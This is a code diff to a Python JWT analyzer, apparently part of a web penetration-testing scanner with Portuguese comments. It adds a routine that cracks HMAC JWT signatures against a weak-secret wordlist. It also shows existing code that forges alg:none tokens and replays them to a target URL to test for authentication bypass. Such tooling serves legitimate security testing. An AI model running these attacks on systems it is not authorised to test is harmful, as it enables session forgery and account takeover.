@@ -4,6 +4,7 @@ JWT Analyzer — Coleta, decodifica e testa JWTs
 Testa alg:none, chaves HS256 fracas, expiração
 Captura raw request/response para Burp modal
 """
+from core.config import DEFAULT_USER_AGENT, REQUEST_DELAY
 import json
 import re
 import base64
@@ -62,6 +63,33 @@ def test_alg_none(token):
     none_header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=").decode()
     none_token = f"{none_header}.{parts[1]}."
     return none_token
+
+
+def test_weak_secrets(token, alg):
+    """Tenta quebrar a assinatura (HS256/384/512) usando hmac local"""
+    if alg.upper() not in ["HS256", "HS384", "HS512"]: 
+        return None
+        
+    parts = token.split(".")
+    if len(parts) != 3: 
+        return None
+        
+    msg = f"{parts[0]}.{parts[1]}".encode()
+    expected_sig = parts[2]
+    
+    import hmac
+    import hashlib
+    hash_fn = hashlib.sha256
+    if alg.upper() == "HS384": hash_fn = hashlib.sha384
+    elif alg.upper() == "HS512": hash_fn = hashlib.sha512
+        
+    for secret in WEAK_SECRETS:
+        sig = hmac.new(secret.encode(), msg, hash_fn).digest()
+        sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
+        if sig_b64 == expected_sig:
+            return secret
+            
+    return None
 
 
 def check_expiration(payload):
@@ -167,18 +195,32 @@ def analyze_jwt(token, source):
             "source": source,
         })
     
-    # 2) Weak algorithm checks
+    # 2) Weak algorithm checks & Local Brute Force
     if alg.upper() in ("HS256", "HS384", "HS512"):
-        findings.append({
-            "type": "SYMMETRIC_ALG",
-            "risk": "MEDIUM",
-            "details": f"Token usa algoritmo simétrico '{alg}' — vulnerável a brute-force de chave",
-            "token_preview": token[:50] + "...",
-            "header": header,
-            "payload": payload,
-            "source": source,
-            "alg_none_token": test_alg_none(token),
-        })
+        cracked_secret = test_weak_secrets(token, alg)
+        
+        if cracked_secret:
+             findings.append({
+                "type": "JWT_SECRET_CRACKED",
+                "risk": "CRITICAL",
+                "details": f"A assinatura do JWT '{alg}' foi CRACKEADA localmente! Segredo: '{cracked_secret}'",
+                "token_preview": token[:50] + "...",
+                "header": header,
+                "payload": payload,
+                "source": source,
+                "cracked_secret": cracked_secret
+             })
+        else:
+            findings.append({
+                "type": "SYMMETRIC_ALG",
+                "risk": "MEDIUM",
+                "details": f"Token usa algoritmo simétrico '{alg}' — suscetível a brute-force de chave offline",
+                "token_preview": token[:50] + "...",
+                "header": header,
+                "payload": payload,
+                "source": source,
+                "alg_none_token": test_alg_none(token),
+            })
     
     # 3) Expiration checks
     exp_issues = check_expiration(payload)
@@ -232,7 +274,7 @@ def test_jwt_on_target(client, url, original_token, none_token):
     for header_name in ["Authorization", "Cookie"]:
         for value in [f"Bearer {none_token}", f"token={none_token}"]:
             try:
-                resp = client.get(url, headers={header_name: value, "User-Agent": "Mozilla/5.0"}, timeout=10)
+                resp = client.get(url, headers={header_name: value, "User-Agent": DEFAULT_USER_AGENT}, timeout=10)
                 if resp.status_code == 200:
                     raw_req = format_raw_request("GET", url, {**dict(resp.request.headers), header_name: value})
                     raw_res = format_raw_response(resp.status_code, dict(resp.headers), resp.text[:2000])
